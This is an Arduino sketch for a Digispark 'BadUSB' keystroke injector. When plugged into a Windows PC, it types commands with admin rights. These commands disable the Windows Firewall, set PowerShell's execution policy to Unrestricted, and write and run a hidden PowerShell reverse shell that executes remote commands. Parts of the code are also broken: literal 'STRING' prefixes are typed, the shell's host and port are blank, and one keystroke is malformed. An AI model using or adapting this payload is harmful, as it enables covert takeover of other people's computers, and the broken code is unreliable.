#include <DigiKeyboard.h>
#define KEY_ENTER 40
#define KEY_DOWN_ARROW 81
#define MOD_GUI_LEFT 8
#define MOD_ALT_LEFT 4
#define KEY_L_CONTROL         0xE0     // Keyboard LeftControl
#define KEY_L_GUI             0xE3    // Keyboard Left GUI


void setup() {
// Launch Notepad as Administrator
delay(750);
DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);
delay(1000);
DigiKeyboard.print("STRING powershell Start-Process notepad -Verb runAs");
DigiKeyboard.write(KEY_ENTER);
delay(750);
DigiKeyboard.sendKeyStroke(KEY_Y , MOD_ALT_LEFT);
delay(750);
DigiKeyboard.write(KEY_ENTER);
delay(1000);

// Modify console window properties
DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT , KEY_SPACE);
delay(1000);
DigiKeyboard.print("STRING m");
delay(1000);
DigiKeyboard.sendKeyPress(KEY_DOWN_ARROW);
for (int i = 0; i < 100; i++) {
  DigiKeyboard.write(KEY_ENTER);
}

// Disable Windows Firewall
DigiKeyboard.print("STRING netsh advfirewall set allprofiles state off");
DigiKeyboard.write(KEY_ENTER);

// Create and execute PowerShell script
DigiKeyboard.print("STRING Add-Content \"$env:TEMP\\57309.ps1\" '$c = New-Object System.Net.Sockets.TCPClient(\"\",);$s = $c.GetStream();[byte[]]$b = 0..255|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2  = $sb + \"PS \" + (pwd).Path + \"> \";$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()'");
DigiKeyboard.write(KEY_ENTER);
DigiKeyboard.print("STRING start-Process powershell.exe -windowstyle hidden \"$env:TEMP\\57309.ps1\"");
DigiKeyboard.write(KEY_ENTER);

// Remove script and save Notepad file
DigiKeyboard.print("STRING Remove-Item $MyINvocation.InvocationName");
DigiKeyboard.write(KEY_ENTER);
DigiKeyboard.sendKeyStroke(KEY_L_CONTROL, KEY_S);
delay(1000);
DigiKeyboard.print("STRING C:\\Windows\\config-57309.ps1");
DigiKeyboard.write(KEY_ENTER);
delay(1000);
DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT , KEY_F | KEY_4);
delay(750);

// Launch Command Prompt as Administrator
DigiKeyboard.sendKeyStroke(KEY_L_GUI, KEY_R);
delay(750);
DigiKeyboard.print("STRING powershell Start-Process cmd -Verb runAs");
DigiKeyboard.write(KEY_ENTER);
delay(750);
DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
delay(1000);

// Modify Command Prompt window properties
DigiKeyboard.print("STRING mode con:cols=14 lines=1");
DigiKeyboard.write(KEY_ENTER);
DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT , KEY_SPACE);
delay(750);
DigiKeyboard.print("STRING m");
delay(750);
DigiKeyboard.write(KEY_DOWN_ARROW);
for (int i = 0; i < 100; i++) {
  DigiKeyboard.write(KEY_ENTER);
}

// Execute PowerShell script in Command Prompt
DigiKeyboard.print("STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
DigiKeyboard.write(KEY_ENTER);
delay(750);
DigiKeyboard.print("STRING powershell.exe -windowstyle hidden -File C:\\Windows\\config-57309.ps1");
DigiKeyboard.write(KEY_ENTER);

}

void loop() {
// nothing

  }